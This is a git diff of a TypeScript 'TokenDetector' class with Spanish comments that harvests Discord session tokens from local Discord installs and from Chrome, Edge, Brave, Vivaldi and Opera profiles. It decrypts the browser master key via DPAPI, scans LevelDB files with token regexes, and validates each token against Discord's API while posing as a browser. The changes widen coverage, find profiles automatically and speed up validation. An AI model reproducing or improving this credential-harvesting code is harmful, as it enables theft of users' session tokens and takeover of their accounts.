@@ -62,17 +62,34 @@ export class TokenDetector {
    */
   static async detectAndValidate(): Promise<DetectResult> {
     const { candidates, diagnostics } = await TokenDetector.detectAll()
-    const valid: { source: string; token: string; user: unknown }[] = []
 
+    const uniqueCandidates: TokenCandidate[] = []
+    const seenTokens = new Set<string>()
     for (const candidate of candidates) {
-      const result = await TokenDetector.validateToken(candidate.token)
+      if (seenTokens.has(candidate.token)) continue
+      seenTokens.add(candidate.token)
+      uniqueCandidates.push(candidate)
+    }
+
+    const validations = await Promise.all(
+      uniqueCandidates.map(async (candidate) => ({
+        candidate,
+        result: await TokenDetector.validateToken(candidate.token)
+      }))
+    )
+
+    const valid: { source: string; token: string; user: unknown }[] = []
+    const seenUserIds = new Set<string>()
+
+    for (const { candidate, result } of validations) {
       if (!result.valid || !result.user) continue
-      const user = result.user as { id: string }
-      if (valid.some((v) => (v.user as { id: string }).id === user.id)) continue
+      const userId = (result.user as { id?: string }).id
+      if (userId && seenUserIds.has(userId)) continue
+      if (userId) seenUserIds.add(userId)
       valid.push({ source: candidate.source, token: candidate.token, user: result.user })
     }
 
-    return { candidates, valid, diagnostics }
+    return { candidates: uniqueCandidates, valid, diagnostics }
   }
 
   /** Recorre las instalaciones de Discord y, opcionalmente, los navegadores. */
@@ -103,7 +120,7 @@ export class TokenDetector {
 
     for (const app of DISCORD_APPS) {
       const basePath = path.join(appData, app.folder)
-      if (!fs.existsSync(basePath)) continue
+      if (!(await TokenDetector.pathExists(basePath))) continue
       anyDiscordInstalled = true
 
       const diagnostic: DetectionDiagnostic = {
@@ -116,7 +133,7 @@ export class TokenDetector {
 
       try {
         const leveldbPath = path.join(basePath, 'Local Storage', 'leveldb')
-        if (!fs.existsSync(leveldbPath)) {
+        if (!(await TokenDetector.pathExists(leveldbPath))) {
           diagnostic.detail = 'Instalado, pero sin almacén local (nunca se inició sesión).'
           diagnostics.push(diagnostic)
           continue
@@ -128,7 +145,9 @@ export class TokenDetector {
           const plain = await TokenDetector.scanForUnencryptedTokens(leveldbPath)
           if (plain.length > 0) {
             for (const token of plain) {
-              candidates.push({ source: app.name, token, path: leveldbPath })
+              if (!candidates.some((c) => c.token === token)) {
+                candidates.push({ source: app.name, token, path: leveldbPath })
+              }
             }
             diagnostic.decrypted = true
             diagnostic.detail = 'Token en claro encontrado (formato antiguo).'
@@ -197,6 +216,15 @@ export class TokenDetector {
 
   // ===== Paso 1-2: clave maestra =====
 
+  private static async pathExists(targetPath: string): Promise<boolean> {
+    try {
+      await fs.promises.access(targetPath)
+      return true
+    } catch {
+      return false
+    }
+  }
+
   /**
    * Lee `Local State` y descifra `os_crypt.encrypted_key` con DPAPI.
    * Deja el motivo exacto del fallo en el diagnóstico.
@@ -206,14 +234,22 @@ export class TokenDetector {
     diagnostic?: DetectionDiagnostic
   ): Promise<Buffer | null> {
     const localStatePath = path.join(basePath, 'Local State')
-    if (!fs.existsSync(localStatePath)) {
-      if (diagnostic) diagnostic.detail = 'No existe «Local State».'
+    let rawState: string
+    try {
+      rawState = await fs.promises.readFile(localStatePath, 'utf-8')
+    } catch (error) {
+      if (diagnostic) {
+        diagnostic.detail =
+          (error as NodeJS.ErrnoException).code === 'ENOENT'
+            ? 'No existe «Local State».'
+            : '«Local State» ilegible o corrupto.'
+      }
       return null
     }
 
     let state: { os_crypt?: Record<string, string> }
     try {
-      state = JSON.parse(fs.readFileSync(localStatePath, 'utf-8'))
+      state = JSON.parse(rawState)
     } catch {
       if (diagnostic) diagnostic.detail = '«Local State» ilegible o corrupto.'
       return null
@@ -297,9 +333,9 @@ export class TokenDetector {
 
     let files: string[]
     try {
-      files = fs
-        .readdirSync(leveldbPath)
-        .filter((f) => f.endsWith('.ldb') || f.endsWith('.log') || f.endsWith('.sst'))
+      files = (await fs.promises.readdir(leveldbPath)).filter(
+        (f) => f.endsWith('.ldb') || f.endsWith('.log') || f.endsWith('.sst')
+      )
     } catch {
       return found
     }
@@ -358,12 +394,12 @@ export class TokenDetector {
   /** Versiones antiguas guardaban el token sin cifrar. */
   private static async scanForUnencryptedTokens(leveldbPath: string): Promise<string[]> {
     const tokens: string[] = []
-    if (!fs.existsSync(leveldbPath)) return tokens
-
     const patterns = [/[\w-]{24,}\.[\w-]{6}\.[\w-]{27,}/g, /mfa\.[\w-]{84,}/g]
     let files: string[] = []
     try {
-      files = fs.readdirSync(leveldbPath).filter((f) => f.endsWith('.ldb') || f.endsWith('.log'))
+      files = (await fs.promises.readdir(leveldbPath)).filter(
+        (f) => f.endsWith('.ldb') || f.endsWith('.log')
+      )
     } catch {
       return tokens
     }
@@ -385,6 +421,18 @@ export class TokenDetector {
 
   // ===== Navegadores (mejor esfuerzo) =====
 
+  private static async discoverBrowserProfiles(basePath: string): Promise<string[]> {
+    const entries = await fs.promises.readdir(basePath, { withFileTypes: true })
+    return entries
+      .filter((entry) => entry.isDirectory() && (entry.name === 'Default' || /^Profile \d+$/.test(entry.name)))
+      .map((entry) => entry.name)
+      .sort((a, b) => {
+        if (a === 'Default') return -1
+        if (b === 'Default') return 1
+        return parseInt(a.replace('Profile ', ''), 10) - parseInt(b.replace('Profile ', ''), 10)
+      })
+  }
+
   private static async scanBrowserProfiles(): Promise<{
     candidates: TokenCandidate[]
     diagnostics: DetectionDiagnostic[]
@@ -394,22 +442,37 @@ export class TokenDetector {
     const localAppData = process.env.LOCALAPPDATA || path.join(os.homedir(), 'AppData', 'Local')
     const appData = process.env.APPDATA || path.join(os.homedir(), 'AppData', 'Roaming')
 
-    const browsers: { name: string; basePath: string; profiles: string[] }[] = [
-      { name: 'Chrome', basePath: path.join(localAppData, 'Google', 'Chrome', 'User Data'), profiles: ['Default', 'Profile 1', 'Profile 2'] },
-      { name: 'Edge', basePath: path.join(localAppData, 'Microsoft', 'Edge', 'User Data'), profiles: ['Default', 'Profile 1', 'Profile 2'] },
-      { name: 'Brave', basePath: path.join(localAppData, 'BraveSoftware', 'Brave-Browser', 'User Data'), profiles: ['Default', 'Profile 1'] },
-      { name: 'Opera', basePath: path.join(appData, 'Opera Software', 'Opera Stable'), profiles: [''] },
-      { name: 'Opera GX', basePath: path.join(appData, 'Opera Software', 'Opera GX Stable'), profiles: [''] }
+    const browsers: { name: string; basePath: string; multiProfile: boolean }[] = [
+      { name: 'Chrome', basePath: path.join(localAppData, 'Google', 'Chrome', 'User Data'), multiProfile: true },
+      { name: 'Edge', basePath: path.join(localAppData, 'Microsoft', 'Edge', 'User Data'), multiProfile: true },
+      { name: 'Brave', basePath: path.join(localAppData, 'BraveSoftware', 'Brave-Browser', 'User Data'), multiProfile: true },
+      { name: 'Vivaldi', basePath: path.join(localAppData, 'Vivaldi', 'User Data'), multiProfile: true },
+      { name: 'Opera', basePath: path.join(appData, 'Opera Software', 'Opera Stable'), multiProfile: false },
+      { name: 'Opera GX', basePath: path.join(appData, 'Opera Software', 'Opera GX Stable'), multiProfile: false }
     ]
 
     for (const browser of browsers) {
-      if (!fs.existsSync(browser.basePath)) continue
+      let profiles: string[]
+      if (browser.multiProfile) {
+        try {
+          profiles = await TokenDetector.discoverBrowserProfiles(browser.basePath)
+        } catch {
+          continue
+        }
+      } else {
+        if (!(await TokenDetector.pathExists(browser.basePath))) continue
+        profiles = ['']
+      }
 
       let reported = false
-      for (const profile of browser.profiles) {
+      let masterKeyResolved = false
+      let masterKey: Buffer | null = null
+      let masterKeyDetail = ''
+
+      for (const profile of profiles) {
         const profilePath = profile ? path.join(browser.basePath, profile) : browser.basePath
         const leveldbPath = path.join(profilePath, 'Local Storage', 'leveldb')
-        if (!fs.existsSync(leveldbPath)) continue
+        if (!(await TokenDetector.pathExists(leveldbPath))) continue
 
         const source = profile ? `${browser.name} (${profile})` : browser.name
         const diagnostic: DetectionDiagnostic = {
@@ -420,9 +483,21 @@ export class TokenDetector {
           detail: ''
         }
 
-        const masterKey = await TokenDetector.getMasterKey(browser.basePath, diagnostic)
+        if (!masterKeyResolved) {
+          const keyDiag: DetectionDiagnostic = {
+            source: browser.name,
+            kind: 'browser',
+            found: true,
+            decrypted: false,
+            detail: ''
+          }
+          masterKey = await TokenDetector.getMasterKey(browser.basePath, keyDiag)
+          masterKeyDetail = keyDiag.detail
+          masterKeyResolved = true
+        }
+
         if (!masterKey) {
-          diagnostic.detail ||= 'Sin clave utilizable (cifrado moderno del navegador).'
+          diagnostic.detail = masterKeyDetail || 'Sin clave utilizable (cifrado moderno del navegador).'
           diagnostics.push(diagnostic)
           reported = true
           continue
@@ -465,6 +540,7 @@ export class TokenDetector {
   static async validateToken(token: string): Promise<{ valid: boolean; user?: unknown }> {
     try {
       const response = await fetch('https://discord.com/api/v10/users/@me', {
+        signal: AbortSignal.timeout(8000),
         headers: {
           Authorization: token,
           'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
